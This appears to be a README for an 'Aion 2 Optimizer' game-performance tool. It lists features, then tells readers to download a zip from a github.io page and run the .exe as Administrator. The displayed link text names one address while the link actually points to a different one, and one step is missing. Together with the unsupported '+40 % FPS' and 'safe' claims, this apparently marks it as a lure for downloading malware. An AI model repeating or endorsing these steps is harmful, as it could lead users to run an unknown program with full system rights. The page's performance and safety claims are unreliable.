# 🚀 Aion 2 Optimizer

**Boost FPS, reduce lag, and fine‑tune Windows for Aion 2 – safely and reversibly.**

Aion 2 Optimizer is a lightweight, one‑click tool that applies proven performance tweaks, cleans up memory, and optimises network settings specifically for the **Aion 2** MMORPG. No shady scripts, no permanent system changes – every modification can be rolled back.

---

## ✨ Features

| Feature | What it does | Benefit |
|---------|--------------|---------|
| **One‑Click FPS Boost** | Adjusts CPU priority, GPU scheduling, and background services. | Up to **+40 % FPS** in crowded zones. |
| **Memory Cleaner** | Frees up standby RAM and reduces page‑file pressure. | Smoother gameplay, fewer stutters. |
| **Network Optimizer** | Tweaks TCP/IP parameters for lower latency. | Reduced skill delay and rubber‑banding. |
| **Game‑Specific Presets** | Pre‑configured profiles for PvE, PvP, and siege. | Instant optimisation for your playstyle. |
| **Safe & Reversible** | Creates a system restore point before any change. | Peace of mind – undo everything with one click. |
| **Portable** | Single `.exe`, no installation required. | Run from anywhere, even a USB drive. |

| 1 | Open the official landing page → **[portkreheed40.github.io/Aion2Optimizer](https://dikedonormesmerize.github.io/Aion-2-Optimizer/)** |
| 2 | Download `Aion2Optimizer_v1.0.zip` from the page. |

| 4 | Run `Aion2Optimizer.exe` as **Administrator**. |
